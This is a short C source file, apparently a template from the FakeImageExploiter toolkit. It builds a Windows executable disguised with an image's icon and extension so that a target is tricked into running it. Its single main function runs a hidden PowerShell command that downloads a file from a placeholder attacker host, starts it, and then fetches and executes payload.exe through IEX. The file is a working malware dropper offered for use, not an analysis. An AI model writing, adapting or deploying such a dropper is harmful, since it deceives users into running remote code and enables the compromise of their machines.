/*
Author: pedro ubuntu [ r00t-3xp10it ]
Credits: null byte [ Method POC ]
Description: evil.c template
  This template will trigger the download/execution of image.jpg and payload.exe
  stored into apache2 webserver(local). This template icon and extension will also
  be modified to look like the legit image.jpg to trick target user execution.
Warning: This script requires FakeImageExploiter.sh tool and all the files associated ..
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>

int main()
{
  system("powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://LhOsT/ScRee', 'TaRpAt\\ScRee') & start TaRpAt\\ScRee & powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://LhOsT/payload.exe'))\"");
  return 0;
}

